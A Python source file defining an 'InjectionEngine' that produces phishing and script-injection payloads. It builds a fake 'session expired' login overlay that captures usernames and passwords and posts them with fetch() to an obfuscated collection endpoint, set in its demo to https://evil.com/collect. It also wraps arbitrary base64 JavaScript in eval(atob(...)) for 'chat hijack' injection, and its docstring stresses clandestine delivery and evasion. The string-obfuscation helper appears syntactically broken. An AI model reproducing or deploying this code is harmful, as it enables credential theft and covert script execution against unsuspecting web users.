import base64
import json
import random
import urllib.parse

class InjectionEngine:
    """
    Advanced Injection Engine for Chat Payloads and Overlay Injection.
    Designed for clandestine delivery and maximum impact with enhanced evasion.
    """
    def __init__(self):
        self.overlays = {
            "login_modal": self._generate_login_overlay(),
            "chat_hijack": self._generate_chat_payload()
        }

    def _obfuscate_string(self, s):
        """Applies simple string obfuscation (e.g., char codes, concatenation)."""
        methods = [
            lambda x: ".join([String.fromCharCode(" + ",".join(str(ord(c)) for c in x) + ")])",
            lambda x: "\"" + "\"+\"\".join([c for c in x]) + "\""
        ]
        return random.choice(methods)(s)

    def _generate_login_overlay(self, c2_endpoint="/api/v1/collect"):
        """Generates a professional login overlay for credential harvesting with obfuscated C2."""
        obfuscated_c2 = self._obfuscate_string(c2_endpoint)
        dynamic_message = random.choice([
            "Your session has expired. Please log in again.",
            "For security reasons, please re-enter your credentials.",
            "Authentication required to continue."
        ])

        html = f"""
        <div id=\'nf-overlay\' style=\'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;display:flex;justify-content:center;align-items:center;\'>
            <div style=\'background:#fff;padding:30px;border-radius:8px;width:350px;font-family:sans-serif;box-shadow:0 4px 8px rgba(0,0,0,0.2);\'>
                <h3 style=\'color:#333;text-align:center;margin-bottom:20px;\'>Security Alert</h3>
                <p style=\'color:#555;text-align:center;margin-bottom:25px;\'>{dynamic_message}</p>
                <input type=\'text\' id=\'nf-user\' placeholder=\'Username\' style=\'width:100%;margin-bottom:15px;padding:10px;border:1px solid #ddd;border-radius:4px;\'>
                <input type=\'password\' id=\'nf-pass\' placeholder=\'Password\' style=\'width:100%;margin-bottom:20px;padding:10px;border:1px solid #ddd;border-radius:4px;\'>
                <button onclick=\'nf_submit()\' style=\'width:100%;padding:12px;background:#007bff;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px;\'>Login</button>
            </div>
        </div>
        <script>
        function nf_submit() {{
            var u = document.getElementById("nf-user").value;
            var p = document.getElementById("nf-pass").value;
            var c2_ep = {obfuscated_c2};
            fetch(c2_ep, {{method:"POST", body:JSON.stringify({{u:u, p:p}})}});
            document.getElementById("nf-overlay").remove();
        }}
        </script>
        """
        return base64.b64encode(html.encode()).decode()

    def _generate_chat_payload(self, custom_js_b64=None):
        """Generates a versatile payload for chat interface testing, supporting custom JS."""
        if custom_js_b64:
            script_to_execute = f"eval(atob(\'{custom_js_b64}\'))"
        else:
            script_to_execute = "console.log(\'Chat Hijack Active - Default Payload\');"

        payload = {
            "trigger": "onMessage",
            "action": "inject_script",
            "script": script_to_execute
        }
        return base64.b64encode(json.dumps(payload).encode()).decode()

    def get_injector_script(self, target_type="login_modal", **kwargs):
        """Returns the JS injector for the specified overlay or chat payload."""
        if target_type == "login_modal":
            b64_content = self._generate_login_overlay(kwargs.get("c2_endpoint", "/api/v1/collect"))
        elif target_type == "chat_hijack":
            b64_content = self._generate_chat_payload(kwargs.get("custom_js_b64"))
        else:
            return ""

        return f"var div = document.createElement(\'div\'); div.innerHTML = atob(\'{b64_content}\'); document.body.appendChild(div);"

if __name__ == "__main__":
    engine = InjectionEngine()
    print("[+] Injection Engine Loaded")
    print("\n--- Login Modal Injector Script (Obfuscated C2) ---")
    print(engine.get_injector_script("login_modal", c2_endpoint="https://evil.com/collect"))
    print("\n--- Chat Hijack Payload (Custom JS) ---")
    custom_alert_js = base64.b64encode("alert(\'Custom Chat Alert!\');".encode()).decode()
    print(engine.get_injector_script("chat_hijack", custom_js_b64=custom_alert_js))
